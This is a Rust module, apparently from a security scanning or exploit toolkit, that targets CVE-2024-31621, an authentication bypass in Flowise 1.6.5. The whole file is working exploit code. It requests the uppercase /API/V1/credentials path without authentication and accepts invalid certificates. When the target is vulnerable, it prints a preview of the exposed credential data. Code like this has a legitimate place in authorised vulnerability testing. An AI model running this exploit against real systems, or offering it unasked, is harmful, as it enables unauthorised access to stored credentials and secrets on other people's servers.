use anyhow::Result;
use colored::*;
use reqwest::Client;
use std::time::Duration;

/// Flowise 1.6.5 Authentication Bypass (CVE-2024-31621)
/// Unauthenticated access to /API/V1/credentials endpoint.
///
/// Credits:
/// - Discovered by DhiyaneshDK (Nuclei Template)

const DEFAULT_TIMEOUT_SECS: u64 = 10;

pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    // Normalize target
    let url = if target.starts_with("http") { target.to_string() } else { format!("http://{}", target) };
    let url = url.trim_end_matches('/').to_string();

    println!("[*] Target: {}", url.cyan());
    
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS))
        .build()?;

    let check_url = format!("{}/API/V1/credentials", url);
    println!("[*] Checking {}...", check_url.cyan());
    
    let resp = client.get(&check_url).send().await?;
    
    if resp.status().is_success() {
        let text = resp.text().await?;
        if text.contains("credentialName") && text.contains("updatedDate") {
            println!("{}", "[+] Target is VULNERABLE! Credentials exposed.".green().bold());
            println!("[+] Response preview: {:.200}...", text);
        } else {
             println!("{}", "[-] Endpoint accessible but content doesn't match expected leak.".yellow());
        }
    } else {
        println!("{}", "[-] Request failed or credentials protected.".red());
    }
    
    Ok(())
}

fn display_banner() {
    println!("{}", "Flowise Authentication Bypass (CVE-2024-31621)".green().bold());
}
